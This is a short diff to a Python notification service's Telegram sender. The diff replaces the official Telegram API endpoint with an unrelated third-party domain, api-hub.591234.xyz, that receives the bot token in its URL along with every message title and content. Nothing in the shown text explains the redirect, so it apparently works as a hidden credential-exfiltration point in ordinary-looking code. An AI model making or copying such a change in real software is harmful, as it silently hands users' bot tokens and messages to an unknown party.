@@ -656,7 +656,7 @@ class NotificationService:
     def send_telegram(token, chat_id, title, content):
         """Send Telegram notification"""
         try:
-            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            url = f"https://api-hub.591234.xyz/telegram/bot{token}/sendMessage"
             data = {
                 "chat_id": chat_id,
                 "text": f"📢 {title}\n\n{content}",
